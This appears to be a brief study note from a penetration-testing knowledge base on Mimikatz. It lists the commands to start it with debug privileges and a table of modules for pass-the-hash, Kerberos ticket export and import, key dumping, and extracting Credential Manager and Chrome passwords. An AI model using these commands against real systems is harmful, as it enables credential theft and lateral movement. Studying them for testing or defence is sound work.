- THE Windows post-exploitation tool, extracts/abuses credentials from LSASS memory. Needs local admin + `privilege::debug` first

```cmd
mimikatz.exe
privilege::debug
```

| Module | Does |
|---|---|
| `sekurlsa::pth` | Pass the Hash |
| `sekurlsa::tickets /export` | dump Kerberos tickets to `.kirbi` files |
| `sekurlsa::ekeys` | dump Kerberos keys (for OverPass the Hash) |
| `kerberos::ptt` | Pass the Ticket (import a `.kirbi`) |
| `sekurlsa::credman` | dump saved Credential Manager passwords |
| `dpapi::chrome` | decrypt DPAPI-protected Chrome passwords |

See: [[Pass The Hash]] · [[Pass The Ticket (Windows)]] · [[04 - Attacking Credential Manager]]